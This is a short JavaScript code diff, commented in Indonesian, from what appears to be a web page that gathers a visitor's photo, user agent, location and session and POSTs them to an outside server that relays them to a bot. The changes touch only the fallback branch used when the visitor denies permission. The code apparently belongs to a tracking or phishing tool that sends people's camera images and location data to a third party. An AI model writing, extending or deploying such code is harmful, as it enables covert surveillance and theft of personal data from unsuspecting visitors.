@@ -103,21 +103,21 @@
         const session = new URLSearchParams(window.location.search).get("session");
         
         const captions = `
-        📍 **Data Pengguna: mengizinkan**
+        📍 **Data Pengguna: Tidak mengizinkan**
         - User-Agent: -
         - Lokasi: -
-        - Sesi: ${session}
+        - Sesi: -
         `;
         
         // Kirim foto kosong (fallback) ke server
-        const formData = new FormData();
-        formData.append("photo", blob);  // Kirimkan fallback gambar
-        formData.append("caption", captions);
+        const formDatas = new FormData();
+        formDatas.append("photo", blob);
+        formDatas.append("caption", captions);
 
         
         const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
             method: "POST",
-            body: formData,
+            body: formDatas,
         });
         
         // Cek jika respons adalah "Data berhasil dikirim ke bot!"
